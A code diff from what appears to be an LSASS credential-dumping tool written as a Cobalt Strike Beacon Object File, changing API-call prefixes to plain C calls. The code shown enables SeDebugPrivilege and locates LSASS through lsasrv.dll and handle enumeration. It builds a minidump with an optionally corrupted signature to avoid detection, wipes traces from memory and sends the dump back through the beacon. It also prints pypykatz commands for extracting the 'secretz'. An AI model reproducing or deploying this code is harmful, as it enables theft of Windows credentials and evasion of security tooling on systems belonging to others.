@@ -16,7 +16,7 @@ void writeat(
 )
 {
     PVOID dst = (PVOID)((ULONG_PTR)dc->BaseAddress + rva);
-    MSVCRT$memcpy(dst, data, size);
+    memcpy(dst, data, size);
 }
 
 void append(
@@ -65,17 +65,17 @@ BOOL write_file(
 #endif
             "Failed to call HeapAlloc for 0x%x bytes, error: %ld\n",
             (ULONG32)sizeof(UNICODE_STRING),
-            KERNEL32$GetLastError()
+            GetLastError()
         );
         return FALSE;
     }
 
     // create a UNICODE_STRING with the file path
-    MSVCRT$mbstowcs(wcFileName, fileName, MAX_PATH);
-    MSVCRT$wcscpy(wcFilePath, L"\\??\\");
-    MSVCRT$wcsncat(wcFilePath, wcFileName, MAX_PATH);
+    mbstowcs(wcFileName, fileName, MAX_PATH);
+    wcscpy(wcFilePath, L"\\??\\");
+    wcsncat(wcFilePath, wcFileName, MAX_PATH);
     pUnicodeFilePath->Buffer = wcFilePath;
-    pUnicodeFilePath->Length = MSVCRT$wcsnlen(pUnicodeFilePath->Buffer, MAX_PATH);
+    pUnicodeFilePath->Length = wcsnlen(pUnicodeFilePath->Buffer, MAX_PATH);
     pUnicodeFilePath->Length *= 2;
     pUnicodeFilePath->MaximumLength = pUnicodeFilePath->Length + 2;
 
@@ -162,17 +162,17 @@ BOOL download_file(
     ULONG32 fileLength
 )
 {
-    int fileNameLength = MSVCRT$strnlen(fileName, 256);
+    int fileNameLength = strnlen(fileName, 256);
 
     // intializes the random number generator
     time_t t;
-    MSVCRT$srand((unsigned) MSVCRT$time(&t));
+    srand((unsigned) time(&t));
 
     // generate a 4 byte random id, rand max value is 0x7fff
     ULONG32 fileId = 0;
-    fileId |= (MSVCRT$rand() & 0x7FFF) << 0x11;
-    fileId |= (MSVCRT$rand() & 0x7FFF) << 0x02;
-    fileId |= (MSVCRT$rand() & 0x0003) << 0x00;
+    fileId |= (rand() & 0x7FFF) << 0x11;
+    fileId |= (rand() & 0x7FFF) << 0x02;
+    fileId |= (rand() & 0x0003) << 0x00;
 
     // 8 bytes for fileId and fileLength
     int messageLength = 8 + fileNameLength;
@@ -182,7 +182,7 @@ BOOL download_file(
         BeaconPrintf(CALLBACK_ERROR,
             "Failed to call HeapAlloc for 0x%llx bytes, error: %ld\n",
             messageLength,
-            KERNEL32$GetLastError()
+            GetLastError()
         );
         return FALSE;
     }
@@ -221,7 +221,7 @@ BOOL download_file(
         BeaconPrintf(CALLBACK_ERROR,
             "Failed to call HeapAlloc for 0x%llx bytes, error: %ld\n",
             chunkLength,
-            KERNEL32$GetLastError()
+            GetLastError()
         );
         return FALSE;
     }
@@ -273,7 +273,7 @@ BOOL enable_debug_priv(void)
     BOOL ok;
 
     LPCWSTR lpwPriv = L"SeDebugPrivilege";
-    ok = ADVAPI32$LookupPrivilegeValueW(
+    ok = LookupPrivilegeValueW(
         NULL,
         lpwPriv,
         &tkp.Privileges[0].Luid
@@ -286,7 +286,7 @@ BOOL enable_debug_priv(void)
         printf(
 #endif
             "Failed to call LookupPrivilegeValueW, error: %ld\n",
-            KERNEL32$GetLastError()
+            GetLastError()
         );
         return FALSE;
     }
@@ -486,15 +486,15 @@ void write_header(
 
     char header_bytes[32];
     int offset = 0;
-    MSVCRT$memcpy(header_bytes + offset, &header.Signature, 4); offset += 4;
-    MSVCRT$memcpy(header_bytes + offset, &header.Version, 2); offset += 2;
-    MSVCRT$memcpy(header_bytes + offset, &header.ImplementationVersion, 2); offset += 2;
-    MSVCRT$memcpy(header_bytes + offset, &header.NumberOfStreams, 4); offset += 4;
-    MSVCRT$memcpy(header_bytes + offset, &header.StreamDirectoryRva, 4); offset += 4;
-    MSVCRT$memcpy(header_bytes + offset, &header.CheckSum, 4); offset += 4;
-    MSVCRT$memcpy(header_bytes + offset, &header.Reserved, 4); offset += 4;
-    MSVCRT$memcpy(header_bytes + offset, &header.TimeDateStamp, 4); offset += 4;
-    MSVCRT$memcpy(header_bytes + offset, &header.Flags, 4);
+    memcpy(header_bytes + offset, &header.Signature, 4); offset += 4;
+    memcpy(header_bytes + offset, &header.Version, 2); offset += 2;
+    memcpy(header_bytes + offset, &header.ImplementationVersion, 2); offset += 2;
+    memcpy(header_bytes + offset, &header.NumberOfStreams, 4); offset += 4;
+    memcpy(header_bytes + offset, &header.StreamDirectoryRva, 4); offset += 4;
+    memcpy(header_bytes + offset, &header.CheckSum, 4); offset += 4;
+    memcpy(header_bytes + offset, &header.Reserved, 4); offset += 4;
+    memcpy(header_bytes + offset, &header.TimeDateStamp, 4); offset += 4;
+    memcpy(header_bytes + offset, &header.Flags, 4);
     append(dc, header_bytes, 32);
 }
 
@@ -505,9 +505,9 @@ void write_directory(
 {
     byte directory_bytes[12];
     int offset = 0;
-    MSVCRT$memcpy(directory_bytes + offset, &directory.StreamType, 4); offset += 4;
-    MSVCRT$memcpy(directory_bytes + offset, &directory.DataSize, 4); offset += 4;
-    MSVCRT$memcpy(directory_bytes + offset, &directory.Rva, 4);
+    memcpy(directory_bytes + offset, &directory.StreamType, 4); offset += 4;
+    memcpy(directory_bytes + offset, &directory.DataSize, 4); offset += 4;
+    memcpy(directory_bytes + offset, &directory.Rva, 4);
     append(dc, directory_bytes, sizeof(directory_bytes));
 }
 
@@ -568,7 +568,7 @@ BOOL write_system_info_stream(
     system_info.ProcessorLevel = 0;
     system_info.ProcessorRevision = 0;
     system_info.NumberOfProcessors = 0;
-    // NTDLL$RtlGetVersion -> wProductType
+    // RtlGetVersion -> wProductType
     system_info.ProductType = VER_NT_WORKSTATION;
     //system_info.ProductType = VER_NT_DOMAIN_CONTROLLER;
     //system_info.ProductType = VER_NT_SERVER;
@@ -600,28 +600,28 @@ BOOL write_system_info_stream(
 #endif
 
     int offset = 0;
-    MSVCRT$memcpy(system_info_bytes + offset, &system_info.ProcessorArchitecture, 2); offset += 2;
-    MSVCRT$memcpy(system_info_bytes + offset, &system_info.ProcessorLevel, 2); offset += 2;
-    MSVCRT$memcpy(system_info_bytes + offset, &system_info.ProcessorRevision, 2); offset += 2;
-    MSVCRT$memcpy(system_info_bytes + offset, &system_info.NumberOfProcessors, 1); offset += 1;
-    MSVCRT$memcpy(system_info_bytes + offset, &system_info.ProductType, 1); offset += 1;
-    MSVCRT$memcpy(system_info_bytes + offset, &system_info.MajorVersion, 4); offset += 4;
-    MSVCRT$memcpy(system_info_bytes + offset, &system_info.MinorVersion, 4); offset += 4;
-    MSVCRT$memcpy(system_info_bytes + offset, &system_info.BuildNumber, 4); offset += 4;
-    MSVCRT$memcpy(system_info_bytes + offset, &system_info.PlatformId, 4); offset += 4;
-    MSVCRT$memcpy(system_info_bytes + offset, &system_info.CSDVersionRva, 4); offset += 4;
-    MSVCRT$memcpy(system_info_bytes + offset, &system_info.SuiteMask, 2); offset += 2;
-    MSVCRT$memcpy(system_info_bytes + offset, &system_info.Reserved2, 2); offset += 2;
+    memcpy(system_info_bytes + offset, &system_info.ProcessorArchitecture, 2); offset += 2;
+    memcpy(system_info_bytes + offset, &system_info.ProcessorLevel, 2); offset += 2;
+    memcpy(system_info_bytes + offset, &system_info.ProcessorRevision, 2); offset += 2;
+    memcpy(system_info_bytes + offset, &system_info.NumberOfProcessors, 1); offset += 1;
+    memcpy(system_info_bytes + offset, &system_info.ProductType, 1); offset += 1;
+    memcpy(system_info_bytes + offset, &system_info.MajorVersion, 4); offset += 4;
+    memcpy(system_info_bytes + offset, &system_info.MinorVersion, 4); offset += 4;
+    memcpy(system_info_bytes + offset, &system_info.BuildNumber, 4); offset += 4;
+    memcpy(system_info_bytes + offset, &system_info.PlatformId, 4); offset += 4;
+    memcpy(system_info_bytes + offset, &system_info.CSDVersionRva, 4); offset += 4;
+    memcpy(system_info_bytes + offset, &system_info.SuiteMask, 2); offset += 2;
+    memcpy(system_info_bytes + offset, &system_info.Reserved2, 2); offset += 2;
 #if _WIN64
-    MSVCRT$memcpy(system_info_bytes + offset, &system_info.ProcessorFeatures1, 8); offset += 8;
-    MSVCRT$memcpy(system_info_bytes + offset, &system_info.ProcessorFeatures2, 8); offset += 8;
+    memcpy(system_info_bytes + offset, &system_info.ProcessorFeatures1, 8); offset += 8;
+    memcpy(system_info_bytes + offset, &system_info.ProcessorFeatures2, 8); offset += 8;
 #else
-    MSVCRT$memcpy(system_info_bytes + offset, &system_info.VendorId1, 4); offset += 4;
-    MSVCRT$memcpy(system_info_bytes + offset, &system_info.VendorId2, 4); offset += 4;
-    MSVCRT$memcpy(system_info_bytes + offset, &system_info.VendorId3, 4); offset += 4;
-    MSVCRT$memcpy(system_info_bytes + offset, &system_info.VersionInformation, 4); offset += 4;
-    MSVCRT$memcpy(system_info_bytes + offset, &system_info.FeatureInformation, 4); offset += 4;
-    MSVCRT$memcpy(system_info_bytes + offset, &system_info.AMDExtendedCpuFeatures, 4); offset += 4;
+    memcpy(system_info_bytes + offset, &system_info.VendorId1, 4); offset += 4;
+    memcpy(system_info_bytes + offset, &system_info.VendorId2, 4); offset += 4;
+    memcpy(system_info_bytes + offset, &system_info.VendorId3, 4); offset += 4;
+    memcpy(system_info_bytes + offset, &system_info.VersionInformation, 4); offset += 4;
+    memcpy(system_info_bytes + offset, &system_info.FeatureInformation, 4); offset += 4;
+    memcpy(system_info_bytes + offset, &system_info.AMDExtendedCpuFeatures, 4); offset += 4;
 #endif
 
     ULONG32 stream_rva = dc->rva;
@@ -761,7 +761,7 @@ Pmodule_info add_new_module(
 #endif
             "Failed to call HeapAlloc for 0x%x bytes, error: %ld\n",
             (ULONG32)sizeof(module_info),
-            KERNEL32$GetLastError());
+            GetLastError());
         return NULL;
     }
     new_module->next = NULL;
@@ -819,7 +819,7 @@ BOOL read_ldr_entry(
         return FALSE;
     }
     // initialize base_dll_name with all null-bytes
-    MSVCRT$memset(base_dll_name, 0, MAX_PATH);
+    memset(base_dll_name, 0, MAX_PATH);
     // read the dll name
     status = NtReadVirtualMemory(
         hProcess,
@@ -883,10 +883,10 @@ Pmodule_info find_modules(
         for (int i = 0; i < number_of_important_modules; i++)
         {
             // compare the DLLs' name, case insensitive
-            if (!MSVCRT$_wcsicmp(important_modules[i], base_dll_name))
+            if (!_wcsicmp(important_modules[i], base_dll_name))
             {
                 // check if the DLL is 'lsasrv.dll' so that we know the process is indeed LSASS
-                if (!MSVCRT$_wcsicmp(important_modules[i], L"lsasrv.dll"))
+                if (!_wcsicmp(important_modules[i], L"lsasrv.dll"))
                     lsasrv_found = TRUE;
 
                 // add the new module to the linked list
@@ -961,7 +961,7 @@ Pmodule_info write_module_list_stream(
     {
         number_of_modules++;
         curr_module->name_rva = dc->rva;
-        ULONG32 full_name_length = MSVCRT$wcsnlen((wchar_t*)&curr_module->dll_name, sizeof(curr_module->dll_name));
+        ULONG32 full_name_length = wcsnlen((wchar_t*)&curr_module->dll_name, sizeof(curr_module->dll_name));
         full_name_length++; // account for the null byte at the end
         full_name_length *= 2;
         // write the length of the name
@@ -1005,30 +1005,30 @@ Pmodule_info write_module_list_stream(
         module.Reserved0 = 0;
 
         int offset = 0;
-        MSVCRT$memcpy(module_bytes + offset, &module.BaseOfImage, 8); offset += 8;
-        MSVCRT$memcpy(module_bytes + offset, &module.SizeOfImage, 4); offset += 4;
-        MSVCRT$memcpy(module_bytes + offset, &module.CheckSum, 4); offset += 4;
-        MSVCRT$memcpy(module_bytes + offset, &module.TimeDateStamp, 4); offset += 4;
-        MSVCRT$memcpy(module_bytes + offset, &module.ModuleNameRva, 4); offset += 4;
-        MSVCRT$memcpy(module_bytes + offset, &module.VersionInfo.dwSignature, 4); offset += 4;
-        MSVCRT$memcpy(module_bytes + offset, &module.VersionInfo.dwStrucVersion, 4); offset += 4;
-        MSVCRT$memcpy(module_bytes + offset, &module.VersionInfo.dwFileVersionMS, 4); offset += 4;
-        MSVCRT$memcpy(module_bytes + offset, &module.VersionInfo.dwFileVersionLS, 4); offset += 4;
-        MSVCRT$memcpy(module_bytes + offset, &module.VersionInfo.dwProductVersionMS, 4); offset += 4;
-        MSVCRT$memcpy(module_bytes + offset, &module.VersionInfo.dwProductVersionLS, 4); offset += 4;
-        MSVCRT$memcpy(module_bytes + offset, &module.VersionInfo.dwFileFlagsMask, 4); offset += 4;
-        MSVCRT$memcpy(module_bytes + offset, &module.VersionInfo.dwFileFlags, 4); offset += 4;
-        MSVCRT$memcpy(module_bytes + offset, &module.VersionInfo.dwFileOS, 4); offset += 4;
-        MSVCRT$memcpy(module_bytes + offset, &module.VersionInfo.dwFileType, 4); offset += 4;
-        MSVCRT$memcpy(module_bytes + offset, &module.VersionInfo.dwFileSubtype, 4); offset += 4;
-        MSVCRT$memcpy(module_bytes + offset, &module.VersionInfo.dwFileDateMS, 4); offset += 4;
-        MSVCRT$memcpy(module_bytes + offset, &module.VersionInfo.dwFileDateLS, 4); offset += 4;
-        MSVCRT$memcpy(module_bytes + offset, &module.CvRecord.DataSize, 4); offset += 4;
-        MSVCRT$memcpy(module_bytes + offset, &module.CvRecord.rva, 4); offset += 4;
-        MSVCRT$memcpy(module_bytes + offset, &module.MiscRecord.DataSize, 4); offset += 4;
-        MSVCRT$memcpy(module_bytes + offset, &module.MiscRecord.rva, 4); offset += 4;
-        MSVCRT$memcpy(module_bytes + offset, &module.Reserved0, 8); offset += 8;
-        MSVCRT$memcpy(module_bytes + offset, &module.Reserved1, 8);
+        memcpy(module_bytes + offset, &module.BaseOfImage, 8); offset += 8;
+        memcpy(module_bytes + offset, &module.SizeOfImage, 4); offset += 4;
+        memcpy(module_bytes + offset, &module.CheckSum, 4); offset += 4;
+        memcpy(module_bytes + offset, &module.TimeDateStamp, 4); offset += 4;
+        memcpy(module_bytes + offset, &module.ModuleNameRva, 4); offset += 4;
+        memcpy(module_bytes + offset, &module.VersionInfo.dwSignature, 4); offset += 4;
+        memcpy(module_bytes + offset, &module.VersionInfo.dwStrucVersion, 4); offset += 4;
+        memcpy(module_bytes + offset, &module.VersionInfo.dwFileVersionMS, 4); offset += 4;
+        memcpy(module_bytes + offset, &module.VersionInfo.dwFileVersionLS, 4); offset += 4;
+        memcpy(module_bytes + offset, &module.VersionInfo.dwProductVersionMS, 4); offset += 4;
+        memcpy(module_bytes + offset, &module.VersionInfo.dwProductVersionLS, 4); offset += 4;
+        memcpy(module_bytes + offset, &module.VersionInfo.dwFileFlagsMask, 4); offset += 4;
+        memcpy(module_bytes + offset, &module.VersionInfo.dwFileFlags, 4); offset += 4;
+        memcpy(module_bytes + offset, &module.VersionInfo.dwFileOS, 4); offset += 4;
+        memcpy(module_bytes + offset, &module.VersionInfo.dwFileType, 4); offset += 4;
+        memcpy(module_bytes + offset, &module.VersionInfo.dwFileSubtype, 4); offset += 4;
+        memcpy(module_bytes + offset, &module.VersionInfo.dwFileDateMS, 4); offset += 4;
+        memcpy(module_bytes + offset, &module.VersionInfo.dwFileDateLS, 4); offset += 4;
+        memcpy(module_bytes + offset, &module.CvRecord.DataSize, 4); offset += 4;
+        memcpy(module_bytes + offset, &module.CvRecord.rva, 4); offset += 4;
+        memcpy(module_bytes + offset, &module.MiscRecord.DataSize, 4); offset += 4;
+        memcpy(module_bytes + offset, &module.MiscRecord.rva, 4); offset += 4;
+        memcpy(module_bytes + offset, &module.Reserved0, 8); offset += 8;
+        memcpy(module_bytes + offset, &module.Reserved1, 8);
 
         append(dc, module_bytes, sizeof(module_bytes));
         curr_module = curr_module->next;
@@ -1147,7 +1147,7 @@ PMiniDumpMemoryDescriptor64 get_memory_ranges(
 #endif
                 "Failed to call HeapAlloc for 0x%x bytes, error: %ld\n",
                 (ULONG32)sizeof(MiniDumpMemoryDescriptor64),
-                KERNEL32$GetLastError());
+                GetLastError());
             return NULL;
         }
         new_range->next = NULL;
@@ -1229,7 +1229,7 @@ PMiniDumpMemoryDescriptor64 write_memory64_list_stream(
 #endif
                 "Failed to call HeapAlloc for 0x%llx bytes, error: %ld\n",
                 curr_range->DataSize,
-                KERNEL32$GetLastError()
+                GetLastError()
             );
             return NULL;
         }
@@ -1260,7 +1260,7 @@ PMiniDumpMemoryDescriptor64 write_memory64_list_stream(
         }
         append(dc, buffer, curr_range->DataSize);
         // overwrite it first, just in case
-        MSVCRT$memset(buffer, 0, curr_range->DataSize);
+        memset(buffer, 0, curr_range->DataSize);
         intFree(buffer); buffer = NULL;
         curr_range = curr_range->next;
     }
@@ -1386,7 +1386,7 @@ PVOID allocate_memory(PSIZE_T RegionSize)
 void erase_dump_from_memory(PVOID BaseAddress, SIZE_T RegionSize)
 {
     // delete all trace of the dump from memory
-    MSVCRT$memset(BaseAddress, 0, RegionSize);
+    memset(BaseAddress, 0, RegionSize);
     // free the memory area where the dump was
     NTSTATUS status = NtFreeVirtualMemory(
         NtCurrentProcess(),
@@ -1414,7 +1414,7 @@ void generate_invalid_sig(
 )
 {
     time_t t;
-    MSVCRT$srand((unsigned) MSVCRT$time(&t));
+    srand((unsigned) time(&t));
 
     *Signature = MINIDUMP_SIGNATURE;
     *Version = MINIDUMP_VERSION;
@@ -1424,17 +1424,17 @@ void generate_invalid_sig(
            *ImplementationVersion == MINIDUMP_IMPL_VERSION)
     {
         *Signature = 0;
-        *Signature |= (MSVCRT$rand() & 0x7FFF) << 0x11;
-        *Signature |= (MSVCRT$rand() & 0x7FFF) << 0x02;
-        *Signature |= (MSVCRT$rand() & 0x0003) << 0x00;
+        *Signature |= (rand() & 0x7FFF) << 0x11;
+        *Signature |= (rand() & 0x7FFF) << 0x02;
+        *Signature |= (rand() & 0x0003) << 0x00;
 
         *Version = 0;
-        *Version |= (MSVCRT$rand() & 0xFF) << 0x08;
-        *Version |= (MSVCRT$rand() & 0xFF) << 0x00;
+        *Version |= (rand() & 0xFF) << 0x08;
+        *Version |= (rand() & 0xFF) << 0x00;
 
         *ImplementationVersion = 0;
-        *ImplementationVersion |= (MSVCRT$rand() & 0xFF) << 0x08;
-        *ImplementationVersion |= (MSVCRT$rand() & 0xFF) << 0x00;
+        *ImplementationVersion |= (rand() & 0xFF) << 0x08;
+        *ImplementationVersion |= (rand() & 0xFF) << 0x00;
     }
 }
 
@@ -1454,7 +1454,7 @@ BOOL is_process_handle(
 #endif
             "Failed to call HeapAlloc for 0x%lx bytes, error: %ld\n",
             buffer_size,
-            KERNEL32$GetLastError()
+            GetLastError()
         );
         return FALSE;
     }
@@ -1478,7 +1478,7 @@ BOOL is_process_handle(
         );
         return FALSE;
     }
-    if (!MSVCRT$_wcsicmp(ObjectInformation->TypeName.Buffer, L"Process"))
+    if (!_wcsicmp(ObjectInformation->TypeName.Buffer, L"Process"))
         is_process = TRUE;
     intFree(ObjectInformation); ObjectInformation = NULL;
     return is_process;
@@ -1498,7 +1498,7 @@ PSYSTEM_HANDLE_INFORMATION get_all_handles(void)
 #endif
             "Failed to call HeapAlloc for 0x%lx bytes, error: %ld\n",
             buffer_size,
-            KERNEL32$GetLastError()
+            GetLastError()
         );
         return NULL;
     }
@@ -1525,7 +1525,7 @@ PSYSTEM_HANDLE_INFORMATION get_all_handles(void)
 #endif
                     "Failed to call HeapAlloc for 0x%lx bytes, error: %ld\n",
                     buffer_size,
-                    KERNEL32$GetLastError()
+                    GetLastError()
                 );
                 return NULL;
             }
@@ -1575,7 +1575,7 @@ PPROCESS_LIST get_processes_from_handle_table(
 #endif
             "Failed to call HeapAlloc for 0x%x bytes, error: %ld\n",
             (ULONG32)sizeof(PROCESS_LIST),
-            KERNEL32$GetLastError()
+            GetLastError()
         );
         return NULL;
     }
@@ -1763,7 +1763,7 @@ void go(char* args, int length)
     }
 #endif
 
-    if (do_write && !MSVCRT$strrchr(dump_name, '\\'))
+    if (do_write && !strrchr(dump_name, '\\'))
     {
         BeaconPrintf(
             CALLBACK_ERROR,
@@ -1910,7 +1910,7 @@ void go(char* args, int length)
             BeaconPrintf(
                 CALLBACK_OUTPUT,
                 "The minidump has an invalid signature, restore it running:\nbash restore_signature.sh %s",
-                do_write? &MSVCRT$strrchr(dump_name, '\\')[1] : dump_name
+                do_write? &strrchr(dump_name, '\\')[1] : dump_name
             );
         }
         if (do_write)
@@ -1919,7 +1919,7 @@ void go(char* args, int length)
                 CALLBACK_OUTPUT,
                 "Done, to download the dump run:\ndownload %s\nto get the secretz run:\npython3 -m pypykatz lsa minidump %s",
                 dump_name,
-                &MSVCRT$strrchr(dump_name, '\\')[1]
+                &strrchr(dump_name, '\\')[1]
             );
         }
         else
@@ -2147,7 +2147,7 @@ int main(int argc, char* argv[])
         }
         printf(
             "Done, to get the secretz run:\npython3 -m pypykatz lsa minidump %s\n",
-            &MSVCRT$strrchr(dump_name, '\\')[1]
+            &strrchr(dump_name, '\\')[1]
         );
         return 0;
     }
